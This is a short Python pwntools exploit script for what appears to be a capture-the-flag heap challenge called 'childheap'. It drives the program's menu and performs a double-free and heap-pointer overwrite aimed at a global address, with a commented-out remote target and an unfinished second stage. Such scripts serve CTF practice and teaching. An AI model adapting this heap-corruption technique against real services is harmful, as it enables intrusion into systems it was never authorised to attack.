from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

p = process('./childheap')
# p = remote("52.78.27.112", 10001)

leaveret = 0x400c7e
puts_got = 0x602020

age_addr = 0x6020c0
code_addr = 0x6020b0

gdb.attach(p)

DEBUG = True

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def s(msg, enter = True):
  msg = msg + "\n" if enter else msg
  p.send(msg)
  if DEBUG:
    log.info("Sent: " + msg)

def alloc(size, data):
  r("> ")
  s("1")

  r("size: ")
  s(str(size))

  r("data: ")
  s(data, False)

def free():
  r("> ")
  s("2")

def secret(code, comment):
  r("> ")
  s("31337")

  r("code: ")
  s(str(code))

  if code == 1397048149:
    r("comment: ")
    s(comment, False)

def modify(name, change_name = False, change_age = False, age = 0):
  r("> ")
  s("3")

  r("(y/n)? ")
  s("y" if change_age else "n")
  if change_age:
    r("age: ")
    s(str(age))

  r("name: ")
  s(name)

  r("(y/n)? ")
  s("y" if change_name else "n")

size = 4095

alloc(size, "A" * (size-1))
free()

modify("B" * 8)
free()

payload = "a" * 8
payload += p64(age_addr - 0x10)

modify(payload)

alloc(size, "B" * (size-1))

"""
payload = "\x00" * 8
payload += p64(age_addr - 0x18)

modify(payload, True)

free()

alloc(4091, "C" * 4090)
"""

p.interactive()
p.close()
